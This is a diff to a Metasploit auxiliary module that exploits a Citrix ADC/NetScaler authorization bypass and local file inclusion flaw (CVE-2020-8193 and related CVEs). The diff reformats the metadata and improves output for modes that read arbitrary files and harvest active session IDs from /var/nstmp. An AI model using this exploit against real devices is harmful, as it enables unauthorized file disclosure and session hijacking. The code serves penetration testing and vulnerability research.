@@ -9,8 +9,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Citrix ADC (NetScaler) LFI Scanner',
-      'Description'    => %{
+      'Name' => 'Citrix ADC (NetScaler) LFI Scanner',
+      'Description' => %{
         The remote device is affected by multiple vulnerabilities.
 
         An authorization bypass vulnerability exists in Citrix ADC and NetScaler Gateway devices.
@@ -19,20 +19,20 @@ class MetasploitModule < Msf::Auxiliary
 
         And Information disclosure (CVE-2020-8195 and CVE-2020-8196) - but at this time unclear which.
       },
-      'Author'         => [
+      'Author' => [
         'Donny Maasland', # Discovery
         'mekhalleh (RAMELLA Sébastien)' # Module author (Zeop Entreprise)
       ],
-      'References'     => [
-        ['CVE', '2020-8193'],
-        ['CVE', '2020-8195'],
-        ['CVE', '2020-8196'],
+      'References' => [
+        ['CVE', '2020-8193'], # Authentication bypass
+        ['CVE', '2020-8195'], # Information disclosure
+        ['CVE', '2020-8196'], # Information disclosure
         ['URL', 'https://dmaasland.github.io/posts/citrix.html'],
         ['URL', 'https://research.nccgroup.com/2020/07/10/rift-citrix-adc-vulnerabilities-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-intelligence/amp/'],
         ['URL', 'https://github.com/jas502n/CVE-2020-8193']
       ],
-      'DisclosureDate' => '2020-07-09',
-      'License'        => MSF_LICENSE,
+      'DisclosureDate' => '2020-07-08',
+      'License' => MSF_LICENSE,
       'DefaultOptions' => {
         'RPORT' => 443,
         'SSL' => true
@@ -145,18 +145,35 @@ class MetasploitModule < Msf::Auxiliary
           end
         end
       when /interactive/
-        # TODO: parse response
         response = read_lfi(datastore['PATH'].gsub('/', '%2F'), var_rand)
         if response.code == 406
-          print_line("#{response.body}")
+          output = response.body
+          if output.length > 0
+            print_warning("#{@message_prefix} - The data are displayed in raw format.")
+            print_line("#{output}")
+          else
+            print_bad("#{@message_prefix} - No data to be showed.")
+          end
+        else
+          print_bad("#{@message_prefix} - Bad HTTP response code.")
         end
 
         return
       when /sessions/
-        # TODO: parse response
         response = read_lfi('/var/nstmp'.gsub('/', '%2F'), var_rand)
         if response.code == 406
-          print_line("#{response.body}")
+          # There has to be a better way.
+          output = response.body.to_s.scan(/sess_\w+/)
+          unless output.empty?
+            print_good("#{@message_prefix} - Active session(s).")
+            output.each do |session|
+              print_line(" - SESSID=#{session.split('_')[1]};")
+            end
+          else
+            print_bad("#{@message_prefix} - No session(s) found.")
+          end
+        else
+          print_bad("#{@message_prefix} - Bad HTTP response code.")
         end
 
         return
